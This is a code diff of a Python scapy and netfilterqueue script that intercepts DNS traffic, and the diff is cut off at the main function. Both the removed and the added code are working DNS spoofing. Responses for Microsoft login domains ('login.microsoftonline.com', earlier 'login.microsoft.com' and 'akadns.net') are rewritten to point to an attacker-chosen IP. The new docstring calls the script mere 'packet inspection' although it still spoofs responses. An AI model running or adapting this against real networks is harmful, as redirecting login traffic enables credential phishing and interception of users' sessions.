@@ -1,84 +1,104 @@
 from scapy.all import *
 import netfilterqueue
 
-# Dictionary to track active DNS queries
-query_tracker = {}
+DISPLAY_NON_DNS: bool = False
 
-# Target domain and spoofed IP
-TARGET_DOMAIN = "login.microsoft.com"
-FAKE_IP = "3.149.241.54"
+TARGET_DOMAIN = 'login.microsoftonline.com'
+SEND_TO = '192.168.0.153'
+# SEND_TO_guacamole = '192.168.0.153'
+
+def packet_dump(packet):
+    """
+    Display detailed information about all layers and fields in a packet.
+    Dynamically traverses the packet layers to avoid attribute errors.
+    """
+    print("=== Packet Dump ===")
+    
+    # Print the high-level summary of the packet
+    print(packet.summary())
+    
+    # Traverse through all layers
+    print("\n--- Layer Details ---")
+    current_layer = packet
+    while current_layer:
+        print(f"[Layer: {type(current_layer).__name__}]")
+        # Get all fields and their values for the current layer
+        if hasattr(current_layer, "fields"):
+            for field_name, field_value in current_layer.fields.items():
+                print(f"  {field_name}: {field_value}")
+        else:
+            print("  No fields available for this layer.")
+        current_layer = current_layer.payload
+        print("-" * 30)
+    
+    # Print the raw packet bytes for deeper inspection
+    print("\n--- Raw Bytes (Hex) ---")
+    print(bytes(packet).hex())
+    print("======================\n")
+
+def override_packet(packet):
+    """
+    Modify only the A records (IP addresses) in the DNS response to point to the spoofed IP.
+    """
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):  # Ensure the DNS response layer exists
+        # Loop through all answers in the DNS response
+        answers = scapy_packet[DNS].an
+        modified_answers = []  # Collect modified answers
+
+        if not isinstance(answers, list):  # Single answer case
+            answers = [answers]
+
+        for answer in answers:
+            if answer.type == 1:  # A record
+                rrname = answer.rrname.decode()
+                original_ip = answer.rdata
+                print(f"  [SPOOFING] Replacing A record {rrname} -> {original_ip} with {SEND_TO}")
+                # Replace the IP address in the A record
+                modified_answers.append(DNSRR(rrname=rrname, rdata=SEND_TO, ttl=answer.ttl))
+            else:
+                # Keep non-A records unchanged
+                modified_answers.append(answer)
+
+        # Update the DNS response with modified answers
+        scapy_packet[DNS].an = modified_answers
+        scapy_packet[DNS].ancount = len(modified_answers)
+
+        # Recalculate checksums and lengths
+        del scapy_packet[IP].len
+        del scapy_packet[IP].chksum
+        del scapy_packet[UDP].len
+        del scapy_packet[UDP].chksum
+
+        # Set the modified packet as the payload
+        packet.set_payload(bytes(scapy_packet))
+    else:
+        print("  [WARNING] DNS response does not have DNSRR layer. Ignoring packet.")
+
+    return packet
+
+
 
 def process_packet(packet):
-    """Process packets and spoof DNS responses only for the final query."""
-    scapy_packet = IP(packet.get_payload())
+    """Process packets and print them without modification."""
+    scapy_packet = IP(packet.get_payload())  # Convert raw packet to Scapy packet
 
-    # Check if the packet has a DNS query
-    if scapy_packet.haslayer(DNSQR):
-        qname = scapy_packet[DNSQR].qname.decode()  # Extract queried domain
-        print(f"[DNS] Packet: {scapy_packet.summary()} - Query: {qname}")
-
-        # Track DNS queries
-        if qname not in query_tracker:
-            query_tracker[qname] = 1
-        else:
-            query_tracker[qname] += 1
-
-        # If the query matches the target domain, spoof the response
-        if TARGET_DOMAIN in qname or "akadns.net" in qname:
-            print(f"[+] Spoofing DNS response for {qname}")
-
-            # Create a fake DNS response
-            answer = DNSRR(
-                rrname=qname,  # Response name matches the query
-                type="A",      # Response type
-                rclass="IN",   # Response class
-                ttl=300,       # Time to live
-                rdlen=4,       # Length of the IP address in bytes
-                rdata=FAKE_IP  # Spoofed IP address
-            )
-            scapy_packet[DNS].an = answer
-            scapy_packet[DNS].ancount = 1
-
-            # Recalculate lengths
-            scapy_packet[IP].len = 20 + 8 + len(bytes(scapy_packet[DNS]))  # IP header + UDP header + DNS payload
-            scapy_packet[UDP].len = 8 + len(bytes(scapy_packet[DNS]))     # UDP header + DNS payload
-
-            # Recalculate checksums
-            del scapy_packet[IP].chksum  # Force IP checksum recalculation
-            del scapy_packet[UDP].chksum  # Force UDP checksum recalculation
-
-            # Print the modified packet
-            print("[MODIFIED PACKET]")
-            print(scapy_packet.show(dump=True))
-
-            # Set the modified packet as the payload
-            packet.set_payload(bytes(scapy_packet))
-        else:
-            print(f"[-] Passing DNS response for {qname}")
-    else:
-        print(f"[NON-DNS] Packet: {scapy_packet.summary()}")
-
+    if scapy_packet.haslayer(DNS):  # Check for DNS layer
+        if scapy_packet[DNS].qr == 0:  # DNS Request
+            print(f"[DNS-PACKET] (type=REQUEST)  {scapy_packet.summary()}")  # Print the packet summary
+        elif scapy_packet[DNS].qr == 1:  # DNS Response
+            print(f"[DNS-PACKET] (type=RESPONSE)  {scapy_packet.summary()}")  # Print the packet summary
+            if scapy_packet.haslayer(DNSRR) and TARGET_DOMAIN in scapy_packet[DNSRR].rrname.decode():
+                packet = override_packet(packet)
+    elif DISPLAY_NON_DNS:
+        print(f"[NON-DNS PACKET] {scapy_packet.summary()}")
+    
     # Forward the packet
     packet.accept()
 
-
-
-def checksum(data):
-    """Calculate the checksum for the given data."""
-    if len(data) % 2 == 1:
-        data += b"\x00"
-    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
-    s = (s >> 16) + (s & 0xFFFF)
-    s += s >> 16
-    return ~s & 0xFFFF
-
-
-
-
-
 def main():
-    """Main function to set up packet interception."""
-    print("[*] Starting DNS spoofing script...")
+    """Main function to inspect and forward packets."""
+    print("[*] Starting packet inspection...")
     queue = netfilterqueue.NetfilterQueue()
 
     try:
